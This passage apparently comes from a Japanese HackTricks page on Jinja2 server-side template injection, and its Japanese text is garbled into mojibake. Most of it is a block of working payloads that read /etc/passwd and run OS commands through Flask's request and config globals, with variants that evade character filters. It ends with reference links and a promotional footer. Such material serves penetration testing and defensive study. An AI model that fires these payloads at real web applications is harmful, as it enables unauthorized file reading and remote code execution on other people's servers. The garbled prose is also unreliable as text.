ã„ãã¤ã‹ã®é–¢æ•°ã‚’è¦‹ã¤ã‘ãŸã‚‰ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§çµ„ã¿è¾¼ã¿é–¢æ•°ã‚’å›å¾©ã§ãã¾ã™ã€‚
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
## å‚è€ƒæ–‡çŒ®

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* [ã“ã“ã§ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆã«ç™»éŒ²ã•ã‚ŒãŸæ–‡å­—ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã®attrãƒˆãƒªãƒƒã‚¯ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3).
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
